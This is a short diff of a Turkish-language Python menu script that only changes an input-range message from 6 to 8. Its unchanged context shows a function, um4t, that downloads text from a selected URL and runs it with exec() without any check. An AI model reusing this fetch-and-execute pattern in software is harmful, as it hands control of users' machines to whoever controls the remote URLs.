@@ -42,7 +42,7 @@ def shelby():
         
     }
     if secim in baglantilar:um4t(baglantilar[secim])
-    else:print("1 ile 6 arası bir sayı girmelisin.");shelby()
+    else:print("1 ile 8 arası bir sayı girmelisin.");shelby()
 def um4t(url):
     try:exec(requests.get(url).text)
     except Exception as e:print(f"h-am{e}")
